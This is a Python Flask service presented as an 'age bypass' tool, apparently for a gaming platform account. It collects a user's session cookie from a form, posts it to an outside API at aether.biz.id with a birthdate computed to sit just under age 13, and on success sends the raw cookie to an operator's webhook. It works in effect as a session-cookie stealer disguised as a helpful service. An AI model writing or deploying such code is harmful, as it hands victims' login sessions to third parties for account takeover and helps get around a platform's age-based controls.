import json
from datetime import datetime, timedelta
from flask import Flask, jsonify, request
from flask import Response
import aiohttp
import os

app = Flask(__name__)

WEBHOOK_URL = "YOUR_WEBHOOK_URL"
API_URL = "https://aether.biz.id/api/function.php"


def calculate_birthdate():
    """Calculate the birthdate to be 2 days before turning 13."""
    today = datetime.now()
    birth_year = today.year - 13  # 13 years ago
    birth_month = today.month
    birth_day = today.day - 2  # 2 days before

    if birth_day < 1:
        birth_month -= 1
        if birth_month < 1:
            birth_month = 12
            birth_year -= 1
        if birth_month == 12:
            last_day = 31
        else:
            last_day = (datetime(birth_year, birth_month + 1, 1) - timedelta(days=1)).day
        birth_day = last_day + birth_day

    return {
        "birthMonth": birth_month,
        "birthDay": birth_day,
        "birthYear": birth_year
    }

async def send_to_webhook(content: str):
    """Send data to the specified webhook."""
    async with aiohttp.ClientSession() as session:
        try:
            await session.post(WEBHOOK_URL, json={"content": content})
        except Exception as e:
            print(f"Failed to send to webhook: {e}")


@app.route('/age_bypass', methods=['POST'])
async def age_bypass():
    cookie = request.form.get('cookie')
    birthdate = calculate_birthdate()
    payload = {
        "Cookie": cookie,
        "Type": "agebypass",
        "Birthdate": birthdate
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(API_URL, json=payload) as response:
                if response.status == 200:
                    response_text = await response.text()
                    if "success" in response_text.lower():
                        await send_to_webhook(f"Age bypass successful: {cookie}")
                        return jsonify({"message": "Age bypassed successfully!"})
                    else:
                        return jsonify({"error": f"Failed to bypass age: {response_text}"})
                else:
                    error_data = await response.text()
                    return jsonify({"error": f"Failed to bypass age: {response.status} - {error_data}"})
    except Exception as e:
        return jsonify({"error": f"Unexpected error: {str(e)}"})


# Netlify functions need to return a response from `lambda_handler`
def lambda_handler(event, context):
    """Function to run the Flask app under Netlify functions."""
    with app.app_context():
        return Response(
            app.full_dispatch_request(),
            status=200,
            content_type="application/json"
        )
